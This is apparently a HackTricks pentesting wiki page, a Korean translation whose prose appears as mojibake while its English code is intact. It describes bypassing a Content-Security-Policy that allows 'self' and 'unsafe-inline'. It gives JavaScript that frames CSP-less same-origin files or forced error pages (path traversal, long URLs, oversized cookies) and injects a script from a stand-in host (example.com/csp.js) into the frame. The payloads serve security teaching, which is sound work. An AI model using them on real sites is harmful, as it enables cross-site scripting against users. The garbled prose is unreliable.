{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


ë‹¤ìŒê³¼ ê°™ì€ êµ¬ì„±:
```
Content-Security-Policy: default-src 'self' 'unsafe-inline';
```
ì½”ë“œê°€ ë¬¸ìì—´ë¡œ ì „ì†¡ë˜ëŠ” í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ê¸ˆì§€í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´: `eval, setTimeout, setInterval`ì€ `unsafe-eval` ì„¤ì •ìœ¼ë¡œ ì¸í•´ ëª¨ë‘ ì°¨ë‹¨ë©ë‹ˆë‹¤.

ì™¸ë¶€ ì†ŒìŠ¤ì˜ ëª¨ë“  ì½˜í…ì¸ ë„ ì°¨ë‹¨ë˜ë©°, ì—¬ê¸°ì—ëŠ” ì´ë¯¸ì§€, CSS, WebSockets, íŠ¹íˆ JSê°€ í¬í•¨ë©ë‹ˆë‹¤.

### í…ìŠ¤íŠ¸ ë° ì´ë¯¸ì§€ í†µí•´

í˜„ëŒ€ ë¸Œë¼ìš°ì €ê°€ ì´ë¯¸ì§€ë¥¼ í…ìŠ¤íŠ¸ë¥¼ HTMLë¡œ ë³€í™˜í•˜ì—¬ í‘œì‹œë¥¼ í–¥ìƒì‹œí‚¤ëŠ” ê²ƒìœ¼ë¡œ ê´€ì°°ë©ë‹ˆë‹¤ (ì˜ˆ: ë°°ê²½ ì„¤ì •, ì¤‘ì•™ ì •ë ¬ ë“±). ë”°ë¼ì„œ `favicon.ico` ë˜ëŠ” `robots.txt`ì™€ ê°™ì€ ì´ë¯¸ì§€ë‚˜ í…ìŠ¤íŠ¸ íŒŒì¼ì´ `iframe`ì„ í†µí•´ ì—´ë¦¬ë©´ HTMLë¡œ ë Œë”ë§ë©ë‹ˆë‹¤. íŠ¹íˆ, ì´ëŸ¬í•œ í˜ì´ì§€ëŠ” ì¢…ì¢… CSP í—¤ë”ê°€ ì—†ìœ¼ë©° X-Frame-Optionsë¥¼ í¬í•¨í•˜ì§€ ì•Šì„ ìˆ˜ ìˆì–´, ì´ë“¤ë¡œë¶€í„° ì„ì˜ì˜ JavaScript ì‹¤í–‰ì´ ê°€ëŠ¥í•´ì§‘ë‹ˆë‹¤:
```javascript
frame=document.createElement("iframe");
frame.src="/css/bootstrap.min.css";
document.body.appendChild(frame);
script=document.createElement('script');
script.src='//example.com/csp.js';
window.frames[0].document.head.appendChild(script);
```
### Via Errors

ìœ ì‚¬í•˜ê²Œ, í…ìŠ¤íŠ¸ íŒŒì¼ì´ë‚˜ ì´ë¯¸ì§€ì™€ ê°™ì€ ì˜¤ë¥˜ ì‘ë‹µì€ ì¼ë°˜ì ìœ¼ë¡œ CSP í—¤ë” ì—†ì´ ì œê³µë˜ë©° X-Frame-Optionsë¥¼ ìƒëµí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜¤ë¥˜ëŠ” iframe ë‚´ì—ì„œ ë¡œë“œë˜ë„ë¡ ìœ ë„ë  ìˆ˜ ìˆìœ¼ë©°, ë‹¤ìŒê³¼ ê°™ì€ ì‘ì—…ì„ í—ˆìš©í•©ë‹ˆë‹¤:
```javascript
// Inducing an nginx error
frame=document.createElement("iframe");
frame.src="/%2e%2e%2f";
document.body.appendChild(frame);

// Triggering an error with a long URL
frame=document.createElement("iframe");
frame.src="/"+"A".repeat(20000);
document.body.appendChild(frame);

// Generating an error via extensive cookies
for(var i=0;i<5;i++){document.cookie=i+"="+"a".repeat(4000)};
frame=document.createElement("iframe");
frame.src="/";
document.body.appendChild(frame);
// Removal of cookies is crucial post-execution
for(var i=0;i<5;i++){document.cookie=i+"="}
```
ì–¸ê¸‰ëœ ì‹œë‚˜ë¦¬ì˜¤ ì¤‘ í•˜ë‚˜ë¥¼ íŠ¸ë¦¬ê±°í•œ í›„, iframe ë‚´ì—ì„œ JavaScript ì‹¤í–‰ì€ ë‹¤ìŒê³¼ ê°™ì´ ê°€ëŠ¥í•˜ë‹¤:
```javascript
script=document.createElement('script');
script.src='//example.com/csp.js';
window.frames[0].document.head.appendChild(script);
```
## References

* [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)


{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
